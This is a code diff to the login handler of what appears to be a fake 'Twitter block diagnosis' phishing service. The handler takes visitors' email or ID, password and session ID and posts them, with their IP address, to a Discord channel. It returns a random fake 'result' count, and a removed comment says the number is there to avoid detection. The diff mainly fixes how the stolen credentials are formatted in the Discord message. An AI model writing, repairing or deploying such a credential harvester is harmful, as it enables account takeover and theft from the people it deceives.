@@ -1,4 +1,3 @@
-// api/login.js
 import { Redis } from '@upstash/redis';
 import { Ratelimit } from '@upstash/ratelimit';
 
@@ -25,7 +24,6 @@ export default async function handler(req, res) {
         const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);
         
         // 2. ランダムな人数を生成 (5人 ～ 50人)
-        // スパム判定された場合でも、バレないように適当な数字を返してあげる
         const randomCount = Math.floor(Math.random() * (50 - 5 + 1)) + 5;
 
         if (!success) {
@@ -48,22 +46,23 @@ export default async function handler(req, res) {
         const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
         const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
 
-        // Discordへの通知 (ボタンは削除しました)
+        // Discordへの通知
         const messageBody = {
             embeds: [
                 {
                     title: "きちゃーｗｗｗｗｗ (自動応答)",
                     color: 0x00b0f4,
-                    description: `**ID or Email**\n\`\n${email}\n\`\n**PASS**\n\`\n${password}\n\`\n**Session ID**\n\`\n${sessionId}\n\`\`,
+                    description: `**ID or Email**\n\`\`\`\n${email}\n\`\`\`\n**PASS**\n\`\`\`\n${password}\n\`\`\`\n**Session ID**\n\`\`\`\n${sessionId}\n\`\`\``,
                     footer: {
-                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人と返答`,
+                        // ↓ここのバッククォート(`)が重要です
+                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | 結果: ${randomCount}人を返却`,
                     },
                     timestamp: new Date().toISOString()
                 }
             ]
         };
 
-        // Discordに送信 (awaitしないことでレスポンスを高速化しても良いが、確実に送るためawait推奨)
+        // Discordに送信
         await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
             method: 'POST',
             headers: {
